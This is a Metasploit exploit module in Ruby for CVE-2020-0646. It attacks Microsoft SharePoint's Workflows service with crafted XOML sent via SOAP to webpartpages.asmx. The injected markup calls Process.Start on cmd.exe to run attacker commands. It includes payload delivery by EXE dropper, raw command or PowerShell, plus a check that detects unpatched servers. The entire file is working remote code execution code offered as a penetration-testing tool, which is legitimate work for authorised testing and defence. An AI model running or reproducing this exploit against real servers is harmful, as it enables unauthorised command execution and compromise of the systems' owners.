# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;SharePoint Workflows XOML Injection&#039;,
      &#039;Description&#039; => %q{
        This module exploits a vulnerability within SharePoint and its .NET backend
        that allows an attacker to execute commands using specially crafted XOML data
        sent to SharePoint via the Workflows functionality.
      },
      &#039;Author&#039; => [
        &#039;Spencer McIntyre&#039;,
        &#039;Soroush Dalili&#039;
      ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2020-0646&#039;],
        [&#039;URL&#039;, &#039;https://www.mdsec.co.uk/2020/01/code-injection-in-workflows-leading-to-sharepoint-rce-cve-2020-0646/&#039;]
      ],
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Targets&#039; => [
        [ &#039;Windows EXE Dropper&#039;, { &#039;Arch&#039; => [ARCH_X86, ARCH_X64], &#039;Type&#039; => :windows_dropper } ],
        [ &#039;Windows Command&#039;, { &#039;Arch&#039; => ARCH_CMD, &#039;Type&#039; => :windows_command, &#039;Space&#039; => 3000 } ],
        [ &#039;Windows Powershell&#039;,
          &#039;Arch&#039;         => [ARCH_X86, ARCH_X64],
          &#039;Type&#039;         => :windows_powershell
        ]
      ],
      &#039;DefaultOptions&#039; => {
        &#039;RPORT&#039; => 443,
        &#039;SSL&#039;   => true
      },
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;2020-03-02&#039;,
      &#039;Notes&#039; =>
      {
        &#039;Stability&#039;   => [CRASH_SAFE,],
        &#039;SideEffects&#039; => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
        &#039;Reliability&#039; => [REPEATABLE_SESSION],
      },
      &#039;Privileged&#039; => true
    ))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The base path to the SharePoint application&#039;, &#039;/&#039; ]),
      OptString.new(&#039;DOMAIN&#039;,    [ true, &#039;The domain to use for Windows authentication&#039;, &#039;WORKGROUP&#039; ]),
      OptString.new(&#039;USERNAME&#039;,  [ true, &#039;Username to authenticate as&#039;, &#039;&#039; ]),
      OptString.new(&#039;PASSWORD&#039;,  [ true, &#039;The password to authenticate with&#039; ])
    ])
  end

  def check
    res = execute_command("echo #{Rex::Text.rand_text_alphanumeric(4 + rand(8))}")
    return CheckCode::Unknown(&#039;Did not receive an HTTP 200 OK response&#039;) unless res&.code == 200

    compiler_errors = extract_compiler_errors(res)
    return CheckCode::Unknown(&#039;No compiler errors were reported&#039;) unless compiler_errors&.length > 0

    # once patched you get a specific compiler error message about the type name
    return CheckCode::Safe if compiler_errors[0].to_s =~ /is not a valid language-independent type name/

    CheckCode::Vulnerable
  end

  def extract_compiler_errors(res)
    return nil unless res&.code == 200

    xml_doc = res.get_xml_document
    result = xml_doc.search(&#039;//*[local-name()=\&#039;ValidateWorkflowMarkupAndCreateSupportObjectsResult\&#039;]&#039;).text
    return nil if result.length == 0

    xml_result = Nokogiri::XML(result)
    xml_result.xpath(&#039;//CompilerError/@Text&#039;)
  end

  def exploit
    # NOTE: Automatic check is implemented by the AutoCheck mixin
    super

    case target[&#039;Type&#039;]
    when :windows_command
      execute_command(payload.encoded)
    when :windows_dropper
      cmd_target = targets.select {|target| target[&#039;Type&#039;] == :windows_command}.first
      execute_cmdstager({linemax: cmd_target.opts[&#039;Space&#039;]})
    when :windows_powershell
      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))
    end
  end

  def escape_command(cmd)
    # a bunch of characters have to be escaped, so use a whitelist of those that are allowed and escape the rest as unicode
    cmd.gsub(/([^a-zA-Z0-9 $:;\-\.=\[\]\{\}\(\)])/) { |x| "\\u%.4x" %x.unpack(&#039;C*&#039;)[0] }
  end

  def execute_command(cmd, opts = {})
    xoml_data = <<-EOS
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages">
      <workflowMarkupText>
        <![CDATA[
          <SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
            <CallExternalMethodActivity x:Name="foo" MethodName=&#039;test1&#039; InterfaceType=&#039;System.String);}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe", "/c #{escape_command(cmd)}");private/**/void/**/foobar(){//&#039; />
          </SequentialWorkflowActivity>
        ]]>
      </workflowMarkupText>
      <rulesText></rulesText>
      <configBlob></configBlob>
      <flag>2</flag>
    </ValidateWorkflowMarkupAndCreateSupportObjects>
  </soap:Body>
</soap:Envelope>
    EOS

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;_vti_bin&#039;, &#039;webpartpages.asmx&#039;),
      &#039;ctype&#039;    => &#039;text/xml; charset=utf-8&#039;,
      &#039;data&#039;     => xoml_data,
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
    })

    unless res&.code == 200
      print_error(&#039;Non-200 HTTP response received while trying to execute the command&#039;)
    end

    res
  end
end

